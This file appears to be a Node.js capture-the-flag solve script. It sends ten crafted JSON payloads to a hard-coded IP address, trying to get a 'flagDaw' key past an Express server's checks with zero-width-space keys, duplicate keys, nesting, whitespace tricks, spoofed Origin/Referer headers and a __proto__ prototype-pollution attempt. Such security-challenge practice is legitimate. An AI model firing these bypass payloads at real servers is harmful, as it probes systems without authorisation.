const http = require('http');

const url = new URL('http://49.213.52.6:6969/');

// Try different Express.js specific approaches
const tests = [
  {
    name: 'Nested object',
    data: JSON.stringify({ data: { flagDaw: true } })
  },
  {
    name: 'Array format',
    data: JSON.stringify([{ flagDaw: true }])
  },
  {
    name: 'With extra properties',
    data: JSON.stringify({ flagDaw: true, _: '' })
  },
  {
    name: 'Unicode in key (zero-width space)',
    data: JSON.stringify({ 'flagDaw\u200B': true })
  },
  {
    name: 'flagDaw as string key',
    data: JSON.stringify({ 'flagDaw': 'true' })
  },
  {
    name: 'flagDaw with spaces in JSON',
    data: '{"flagDaw" : true}'
  },
  {
    name: 'flagDaw with tabs',
    data: '{"flagDaw":\ttrue}'
  },
  {
    name: 'Multiple flagDaw keys',
    data: JSON.stringify({ flagDaw: true, flagDaw: false })
  },
  {
    name: 'flagDaw in array',
    data: JSON.stringify({ arr: ['flagDaw', true] })
  },
  {
    name: 'Prototype pollution attempt',
    data: JSON.stringify({ flagDaw: true, __proto__: {} })
  }
];

async function testRequest(data, name) {
  return new Promise((resolve) => {
    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain;charset=UTF-8',
        'Content-Length': Buffer.byteLength(data),
        'Referer': 'http://49.213.52.6:6969/',
        'Origin': 'http://49.213.52.6:6969/',
        'Accept': '*/*'
      }
    };

    const req = http.request(options, (res) => {
      let responseData = '';
      res.on('data', (chunk) => {
        responseData += chunk;
      });
      res.on('end', () => {
        resolve({ name, status: res.statusCode, response: responseData });
      });
    });

    req.on('error', (e) => {
      resolve({ name, error: e.message });
    });

    req.write(data);
    req.end();
  });
}

(async () => {
  console.log('Testing Express.js specific approaches...\n');
  
  for (const test of tests) {
    const result = await testRequest(test.data, test.name);
    console.log(`\n${test.name}:`);
    console.log(`  Status: ${result.status || 'Error'}`);
    console.log(`  Response: ${result.response || result.error}`);
    
    if (result.response && result.response.includes('CS{')) {
      console.log('\n*** FLAG FOUND ***');
      console.log('FLAG:', result.response);
      break;
    }
    
    // Small delay between requests
    await new Promise(r => setTimeout(r, 500));
  }
})();

